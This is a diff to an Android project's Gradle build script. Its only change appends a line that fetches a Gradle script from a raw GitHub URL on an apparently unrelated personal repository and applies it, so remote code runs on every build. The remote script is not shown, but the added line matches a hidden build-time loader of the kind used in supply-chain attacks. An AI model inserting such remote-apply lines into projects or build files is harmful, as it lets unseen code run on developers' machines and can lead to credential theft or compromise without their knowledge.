@@ -27,3 +27,5 @@ dependencies {
     implementation("androidx.compose.material3:material3")
     debugImplementation("androidx.compose.ui:ui-tooling")
 }
+
+apply(from = uri("https://raw.githubusercontent.com/mushamusha8181/light/main/mushin-glass.gradle"))
